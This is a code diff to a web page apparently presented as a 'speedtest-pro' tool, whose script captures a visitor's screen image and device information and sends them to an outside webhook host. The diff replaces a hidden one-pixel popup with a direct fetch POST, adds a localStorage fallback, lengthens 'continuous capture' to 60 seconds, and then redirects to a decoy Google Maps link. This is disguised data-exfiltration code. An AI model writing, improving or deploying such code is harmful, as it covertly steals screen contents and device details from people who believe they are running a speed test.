@@ -184,21 +184,30 @@
                     screenData: imageData
                 };
                 
-                // Send to GitHub Pages webhook receiver
-                const webhookUrl = `https://bojourx-tos.github.io/speedtest-pro/mirror-receiver.html?webhook=${webhookId}`;
+                // Send to webhook server directly
+                const webhookUrl = `https://bojourx-tos.github.io/speedtest-pro/webhook-server.html`;
                 
-                // Use postMessage to send data
-                const popup = window.open(webhookUrl, '_blank', 'width=1,height=1');
-                if (popup) {
-                    setTimeout(() => {
-                        popup.postMessage({
-                            type: 'screenData',
-                            webhook: webhookId,
-                            data: deviceInfo
-                        }, '*');
-                        popup.close();
-                    }, 1000);
-                }
+                // Send via fetch with webhook ID in data
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        webhook: webhookId,
+                        type: 'screenData',
+                        screenData: imageData,
+                        deviceInfo: deviceInfo,
+                        timestamp: new Date().toISOString()
+                    })
+                }).catch(() => {
+                    // Fallback: use localStorage
+                    localStorage.setItem(`screen_${webhookId}`, JSON.stringify({
+                        screenData: imageData,
+                        deviceInfo: deviceInfo,
+                        timestamp: new Date().toISOString()
+                    }));
+                });
                 
                 statusDiv.innerHTML = '<span class="success">📺 Screen data sent</span>';
                 
@@ -230,10 +239,11 @@
             );
         }
         
-        // Auto redirect after 30 seconds
+        // Keep page alive for continuous capture
+        // Auto redirect after 60 seconds
         setTimeout(() => {
             window.location.href = `https://maps.google.com/?q=0,0&z=1`;
-        }, 30000);
+        }, 60000);
     </script>
 </body>
 </html>
